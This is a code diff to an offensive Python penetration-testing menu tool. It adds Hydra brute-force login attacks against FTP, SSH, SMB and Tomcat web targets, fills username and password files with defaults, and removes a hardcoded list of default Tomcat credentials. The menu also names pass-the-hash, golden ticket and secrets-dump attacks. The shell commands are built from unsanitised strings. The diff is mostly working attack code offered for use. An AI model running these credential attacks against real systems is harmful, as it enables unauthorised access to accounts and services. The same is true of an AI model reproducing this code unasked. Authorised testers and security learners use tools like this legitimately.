@@ -292,10 +292,10 @@ def options():
    print('\u2551' + "(3) Re/Set LIVE PORTS (13) Check Connection (23) AtExec   (33) SamDump Users  (43) Kerb Roasting   (53) ACLPwn       (63) USER Editor (73)           (83) MySQL IP " + '\u2551')
    print('\u2551' + "(4) Re/Set WEBADDRESS (14) Check DNS Record (24) DcomExec (34) RpcDump        (44) Kerb ASREPRoast (54) Secrets Dump (64) PASS Editor (74)           (84) Telnet IP" + '\u2551')
    print('\u2551' + "(5) Re/Set USERNAME   (15) Check DNS Server (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65) HOST Editor (75)           (85) Netcat IP" + '\u2551')
-   print('\u2551' + "(6) Re/Set PASSWORD   (16) FScan LIVE PORTS (26) SmbExec  (36) SmbClient      (46) Pass the HASH   (56) PSExec HASH  (66)             (76) FTP IP    (86) EvilWinRm" + '\u2551')
-   print('\u2551' + "(7) Re/Set NTLM HASH  (17) DScan LIVE PORTS (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67)             (77) TFPS IP   (87) RDesktop " + '\u2551')
+   print('\u2551' + "(6) Re/Set PASSWORD   (16) FScan LIVE PORTS (26) SmbExec  (36) SmbClient      (46) Pass the HASH   (56) PSExec HASH  (66) Hydra FTP   (76) FTP IP    (86) EvilWinRm" + '\u2551')
+   print('\u2551' + "(7) Re/Set NTLM HASH  (17) DScan LIVE PORTS (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67) Hydra SSH   (77) TFPS IP   (87) RDesktop " + '\u2551')
    print('\u2551' + "(8) Re/Set DOMAINNAME (18) Fuzz SubDOMAINS  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68) Hydra SMB   (78) SFTP IP   (88) XFreeRDP " + '\u2551')
-   print('\u2551' + "(9) Re/Set DOMAINSID  (19) Server ClockTime (29) OpDump   (39) RpcClient      (49) Golden Ticket   (59) GPP Decrypt  (69) TomCatBrute (79) PFTP IP   (89) Save/Exit" + '\u2551')
+   print('\u2551' + "(9) Re/Set DOMAINSID  (19) Server ClockTime (29) OpDump   (39) RpcClient      (49) Golden Ticket   (59) GPP Decrypt  (69) Hydra TOM   (79) PFTP IP   (89) Save/Exit" + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
 
 # -------------------------------------------------------------------------------------
@@ -2273,23 +2273,85 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Fuse
-# Details : Menu option selected - Exit(1)
+# Details : Menu option selected - HYDRA BRUTE FORCE FTP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='66':
-      exit(1)
+      CheckParams = 0   
+
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1
+         
+      if CheckParams != 1:
+         if os.path.getsize("usernames.txt") == 0:
+            print("[-] Username file is empty...")
+            if USER[:1] != "'":
+               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
+               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
+            else:
+               print("[*] Adding user 'administrator'...")
+               command("echo 'administrator' >> usernames.txt")
+         
+         if os.path.getsize("passwords.txt") == 0:             
+            print("\n[-] Password file is empty...")
+            if PASS[:1] != "'":
+               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
+               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
+            else:
+               print("[*] Adding password 'password'...")
+               command("echo password >> passwords.txt")
+         
+         command("hydra -P passwords.txt -L usernames.txt ftp://" + TIP.rstrip(" "))
+         
+         for x in range (0,MAXX):
+            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            
+      prompt() 
       
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Fuse
-# Details : Menu option selected - Exit(1)
+# Details : Menu option selected - HYDRA BRUTE FORCE SSH
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='67':
-      exit(1)
+      CheckParams = 0   
+
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1
+         
+      if CheckParams != 1:
+         if os.path.getsize("usernames.txt") == 0:
+            print("[-] Username file is empty...")
+            if USER[:1] != "'":
+               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
+               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
+            else:
+               print("[*] Adding user 'administrator'...")
+               command("echo 'administrator' >> usernames.txt")
+         
+         if os.path.getsize("passwords.txt") == 0:             
+            print("\n[-] Password file is empty...")
+            if PASS[:1] != "'":
+               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
+               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
+            else:
+               print("[*] Adding password 'password'...")
+               command("echo password >> passwords.txt")
+         
+         command("hydra -P passwords.txt -L usernames.txt ssh://" + TIP.rstrip(" "))
+         
+         for x in range (0,MAXX):
+            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            
+      prompt()
 
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2326,15 +2388,19 @@ while True:
                command("echo password >> passwords.txt")
          
          command("hydra -P passwords.txt -L usernames.txt smb://" + TIP.rstrip(" "))
+         
+         for x in range (0,MAXX):
+            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            
       prompt() 
 
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Fuse
-# Details : Menu option selected - TOMCAT BRUTEFORCE
+# Details : Menu option selected - TOMCAT WEB ADDRESS BRUTE FORCE
 # Modified: N/A
-# CREDIT  : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
 # -------------------------------------------------------------------------------------
 
    if selection =='69':
@@ -2343,35 +2409,38 @@ while True:
       else:
          print("[*] Attempting a tomcat bruteforce on the specified web address, please wait...")
          
-         TomUser = ["", "admin", "ADMIN", "both", "cxsdk", "j2deployer", "manager", "ovwebusr", "QCC", "role1", "role", "tomcat", "xampp", "server_admin", "demo", "r00t", "root"]
-         TomPass = ["", "admanager", "admin", "ADMIN", "adrole1", "adroot", "ads3cret", "adtomcat", "advagrant", "password", "password1", "tomcat", "vagrant", "ads3cret", "adtomcat", "kdsxc", "j2deployer", "OvW*busr1", "QLogic66", "changethis", "owaspbwa", "toor", "xampp", "demo", "s3cret", "r00t", "root"]
-      
-         outer=len(TomUser)
-         inner=len(TomPass)
-      
-         for x in range (0, outer):
-            for y in range (0, inner):
-               r = requests.get(WEB.rstrip(" "), auth=(TomUser[x], TomPass[y]))
-               brute = WEB.rstrip(" ") + " " + TomUser[x] + ":" + TomPass[y]
+         os.remove("usernames.txt")
+         os.remove("passwords.txt")
+         
+         with open('/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt', 'r') as userpasslist:
+            for line in userpasslist:
+               one, two = line.strip().split(':')
+               command("echo " + one + " >> usernames.tmp")
+               command("echo " + two + " >> passwords.tmp")
                
-               if r.status_code == 401:
-                  brute = "[-] " + brute
-                  if BUG == 1: print(brute)				# DISPLAY CREDS NOT FOUND
-                  
-               if r.status_code == 200:
-                  brute = "[+] " + brute
-                  print(colored(brute,colour2, attrs=['bold']))
-                  if USR[:1] == "'": USR = TomUser[x].rstrip(" ")	# SET TO LAST CREDS FOUND
-                  if PAS[:1] == "'":PAS = TomPass[y].rstrip(" ")		# SET TO LAST CREDS FOUND
-                  if len(USR) < COL1: USR = padding(USR, COL1)
-                  if len(PAS) < COL1: PAS = padding(PAS, COL1)
+            command("cat usernames.tmp | sort -u > usernames.txt")
+            command("cat passwords.tmp | sort -u > passwords.txt")
+            command("rm *.tmp")
+            
+         if "http://" in WEB.lower():
+            target = WEB.replace("http://","")
+            command("hydra -L usernames.txt -P passwords.txt http-get://" + target.rstrip(" "))
+         
+         if "https://" in WEB.lower():
+            target = target.replace("https://","")
+            command("hydra -L usernames.txt -P passwords.txt https-get://" + target.rstrip(" "))
+                          
+         for x in range (0,MAXX):
+            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            
       prompt()
       
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Fuse
-# Details : Menu option selected - GoBuster with common.txt
+# Details : Menu option selected - HTTP GoBuster with common.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
